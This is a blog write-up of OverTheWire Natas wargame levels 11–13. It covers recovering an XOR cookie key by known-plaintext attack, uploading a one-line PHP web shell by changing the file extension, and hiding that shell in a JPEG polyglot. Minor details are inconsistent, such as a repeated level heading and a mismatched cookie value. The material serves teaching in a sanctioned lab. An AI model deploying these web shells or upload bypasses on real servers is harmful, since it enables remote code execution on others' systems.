---
layout: post
title: OverTheWire - Natas Solutions 11 - 15
date: 2025-04-27
categories: [OverTheWire, natas, Web, Encryption, XOR, Known-Plaintext Attack]
---
# Natas Solutions

This page contains my solutions for the Natas wargame challenges 11 - 15 from OverTheWire.

## Overview
Natas teaches the basics of serverside web-security. Each level contains its own website that requires you to find a vulnerability to gain access to the next level.

## Solutions

### Level 11 --> Level 12
**URL**: http://natas11.natas.labs.overthewire.org  
**Username**: natas11  
**Password**: [REDACTED]

#### Solution

1. I visited the URL and logged in with the provided credentials. The page indicated that cookies are protected with XOR encryption.
   ![Welcome](/assets/img/overthewire/natas11_15/natas11_1.png)
2. I inspected the cookies and there was `Data` with the value `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`.
3. By viewing the source code, I understood how the cookie is processed:
   ```php
   <?
   $defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");

   function xor_encrypt($in) {
       $key = '<censored>';
       $text = $in;
       $outText = '';

       for($i=0;$i<strlen($text);$i++) {
           $outText .= $text[$i] ^ $key[$i % strlen($key)];
       }

       return $outText;
   }

   function loadData($def) {
       global $_COOKIE;
       $mydata = $def;
       if(array_key_exists("data", $_COOKIE)) {
           $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
           if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
               if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
                   $mydata['showpassword'] = $tempdata['showpassword'];
                   $mydata['bgcolor'] = $tempdata['bgcolor'];
               }
           }
       }
       return $mydata;
   }

   function saveData($d) {
       setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
   }

   $data = loadData($defaultdata);

   if(array_key_exists("bgcolor",$_REQUEST)) {
       if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
           $data['bgcolor'] = $_REQUEST['bgcolor'];
       }
   }

   saveData($data);
   ?>
   ```
4. The cookie data is JSON-encoded, XOR-encrypted with a static key, and then base64-encoded. To decrypt it, I needed to reverse these steps.
5. I performed a known-plaintext attack using the expected JSON structure `{"showpassword":"no","bgcolor":"#ffffff"}` to deduce the XOR key. This attack works because XOR encryption is reversible if you know part of the plaintext and have the ciphertext. By XORing the known plaintext with the ciphertext, I could recover the key or its repeating pattern.
   ```ini
   Ciphertext = Plaintext ⊕ Key
   Key = Plaintext ⊕ Ciphertext
   ```
6. I used the following Python script to determine the key from the repeating pattern:

   ```python
   import base64

   cookie_value = 'HmYkBwozJw4WNyAAFyB1VUcq0E1JZjUIBis7ABdmbU1GJjEJASBjTRg%3D'
   cookie_value = cookie_value.replace('%3D', '=')  # Handle URL encoding

   ciphertext = base64.b64decode(cookie_value)
   plaintext = '{"showpassword":"no","bgcolor":"#ffffff"}'

   key_stream = []
   for i in range(len(plaintext)):
       key_stream.append(chr(ciphertext[i] ^ ord(plaintext[i])))

   key_guess = ''.join(key_stream)
   print(f"Key Stream: {key_guess}")
   ```
7. Once I obtained the key, I created a new cookie value with `{"showpassword":"yes","bgcolor":"#ffffff"}`:

   ```python
   import base64

   def xor_encrypt(data, key):
       out = ''
       for i in range(len(data)):
           out += chr(ord(data[i]) ^ ord(key[i % len(key)]))
       return out

   key = 'eDWo'
   plaintext = '{"showpassword":"yes","bgcolor":"#ffffff"}'
   encrypted = xor_encrypt(plaintext, key)
   cookie_value = base64.b64encode(encrypted.encode()).decode()

   print(cookie_value)
   ```
8. I set the new cookie value in my browser and reloaded the page, which revealed the password for natas12.
   ![Goodbye :)](/assets/img/overthewire/natas11_15/natas11_2.png)
**Password for Level 12**: [REDACTED]

---

### Level 12 --> Level 13
**URL**: http://natas12.natas.labs.overthewire.org  
**Username**: natas12  
**Password**: [REDACTED]

#### Solution

1. Upon accessing the natas12 page, I noticed an option to upload a file, hinting at a potential Remote Code Execution (RCE) challenge.
   ![RCE Maybe?](/assets/img/overthewire/natas11_15/natas12_1.png)
2. I attempted to upload a simple PHP web shell to execute commands:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. However, the uploaded file was automatically converted to a `.jpg` extension, which was not desirable for executing PHP code ;).
   ![Why JPG!](/assets/img/overthewire/natas11_15/natas12_2.png)
4. I examined the source code to understand the file handling process:
   ```php
   <?php

   function genRandomString() {
       $length = 10;
       $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
       $string = "";

       for ($p = 0; $p < $length; $p++) {
           $string .= $characters[mt_rand(0, strlen($characters)-1)];
       }

       return $string;
   }

   function makeRandomPath($dir, $ext) {
       do {
       $path = $dir."/".genRandomString().".".$ext;
       } while(file_exists($path));
       return $path;
   }

   function makeRandomPathFromFilename($dir, $fn) {
       $ext = pathinfo($fn, PATHINFO_EXTENSION);
       return makeRandomPath($dir, $ext);
   }

   if(array_key_exists("filename", $_POST)) {
       $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

       if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
           echo "File is too big";
       } else {
           if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
               echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
           } else {
               echo "There was an error uploading the file, please try again!";
           }
       }
   } else {
   ?>
   ```
5. The code revealed that the file name and path were randomized, but the extension was determined by the POST request. This allowed me to intercept the request and change the `.jpg` extension back to `.php`.
   ![PHP](/assets/img/overthewire/natas11_15/natas12_3.png)
6. After successfully uploading the PHP file, I crafted a malicious request to test the web shell, confirming the RCE vulnerability. And there I got the password for the next Level!
   ![Pwned](/assets/img/overthewire/natas11_15/natas12_4.png)

**Password for Level 13**: [REDACTED]

---

## Level 12 --> Level 13
**URL**: http://natas12.natas.labs.overthewire.org  
**Username**: natas12  
**Password**: [REDACTED]

#### Solution

1. Upon accessing the Natas13 challenge, I was greeted with a message indicating that only image files are accepted for upload. Attempting to upload a non-image file resulted in the error message: `File is not an image`.
   ![Not a PNG File](/assets/img/overthewire/natas11_15/natas13_1.png)

2. I examined the source code to understand the file validation process:
   ```php
   <?php

   function genRandomString() {
       $length = 10;
       $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
       $string = "";

       for ($p = 0; $p < $length; $p++) {
           $string .= $characters[mt_rand(0, strlen($characters)-1)];
       }

       return $string;
   }

   function makeRandomPath($dir, $ext) {
       do {
       $path = $dir."/".genRandomString().".".$ext;
       } while(file_exists($path));
       return $path;
   }

   function makeRandomPathFromFilename($dir, $fn) {
       $ext = pathinfo($fn, PATHINFO_EXTENSION);
       return makeRandomPath($dir, $ext);
   }

   if(array_key_exists("filename", $_POST)) {
       $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

       $err=$_FILES['uploadedfile']['error'];
       if($err){
           if($err === 2){
               echo "The uploaded file exceeds MAX_FILE_SIZE";
           } else{
               echo "Something went wrong :/";
           }
       } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
           echo "File is too big";
       } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
           echo "File is not an image";
       } else {
           if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
               echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
           } else{
               echo "There was an error uploading the file, please try again!";
           }
       }
   } else {
   ?>
   ```

3. The `exif_imagetype()` function is used to verify if the uploaded file is an image by checking its magic bytes. Magic bytes are specific sequences of bytes at the beginning of a file that indicate its format. This function does not consider the file extension, which can be exploited.

4. To bypass this check, I created a polyglot JPEG file. A polyglot file is a file that is valid in more than one format. I took a small JPEG image and appended PHP code to it:
   ```bash
   echo "<?php system(\$_GET['cmd']); ?>" >> natas13_HiddenCodeInside.jpg
   ```
   ![Payload](/assets/img/overthewire/natas11_15/natas13_2.png)

5. After uploading the modified JPEG file, I intercepted the request and changed the file extension from `.jpg` to `.php`. This allowed the server to execute the PHP code embedded in the image.
   ![Upload](/assets/img/overthewire/natas11_15/natas13_3.png)

6. By accessing the uploaded file with a command parameter, I successfully executed commands on the server, confirming the RCE vulnerability. With this I got the next Password!! 
   ![Pwned](/assets/img/overthewire/natas11_15/natas13_4.png)

**Password for Level 14**: [REDACTED]

---